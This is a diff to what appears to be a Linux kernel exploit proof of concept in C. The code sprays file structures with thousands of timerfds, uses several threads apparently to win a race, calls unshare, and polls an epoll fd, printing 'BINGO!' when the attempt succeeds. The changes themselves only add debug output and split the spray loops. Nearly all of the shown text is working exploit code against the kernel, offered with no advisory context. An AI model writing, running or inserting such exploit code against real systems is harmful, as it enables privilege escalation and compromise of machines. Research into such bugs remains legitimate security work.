@@ -34,9 +34,19 @@ void *thread2_func(void *arg) {
 }
 
 void spray_timerfds(int count) {
-    for (int i = 0; i < count; i++) {
+    for (int i = 0; i < 10; i++) {
         spray_fds[i] = timerfd_create(CLOCK_MONOTONIC, 0);
-        // Make the timerfd readable immediately so timerfd_poll returns EPOLLIN
+        printf("[+] Thread 3: timerfd_create(%d) = %d\n", i, spray_fds[i]);
+        struct itimerspec its;
+        its.it_value.tv_sec = 0;
+        its.it_value.tv_nsec = 1;
+        its.it_interval.tv_sec = 0;
+        its.it_interval.tv_nsec = 0;
+        timerfd_settime(spray_fds[i], 0, &its, NULL);
+    }
+    printf("[+] Thread 3: Suppressing remaining timerfd prints...\n");
+    for (int i = 10; i < count; i++) {
+        spray_fds[i] = timerfd_create(CLOCK_MONOTONIC, 0);
         struct itimerspec its;
         its.it_value.tv_sec = 0;
         its.it_value.tv_nsec = 1;
@@ -101,7 +111,18 @@ int main() {
     unshare(1111);
     
     // Spray file structs via timerfd_create() on CPU 0
-    for(int i = 4000; i < 8000; i++) {
+    for(int i = 4000; i < 4010; i++) {
+        spray_fds[i] = timerfd_create(CLOCK_MONOTONIC, 0);
+        printf("[+] timerfd_create(%d) = %d\n", i, spray_fds[i]);
+        struct itimerspec its;
+        its.it_value.tv_sec = 0;
+        its.it_value.tv_nsec = 1;
+        its.it_interval.tv_sec = 0;
+        its.it_interval.tv_nsec = 0;
+        timerfd_settime(spray_fds[i], 0, &its, NULL);
+    }
+    printf("[+] Suppressing remaining timerfd prints...\n");
+    for(int i = 4010; i < 8000; i++) {
         spray_fds[i] = timerfd_create(CLOCK_MONOTONIC, 0);
         struct itimerspec its;
         its.it_value.tv_sec = 0;
@@ -112,7 +133,9 @@ int main() {
     }
     
     struct epoll_event events[1];
+    printf("[+] Calling epoll_wait(outer_epfd)...\n");
     int n = epoll_wait(outer_epfd, events, 1, 1000);
+    printf("[+] epoll_wait returned %d\n", n);
     
     if (n > 0) {
         printf("BINGO! epoll_wait returned %d events! fd=%d\n", n, events[0].data.fd);
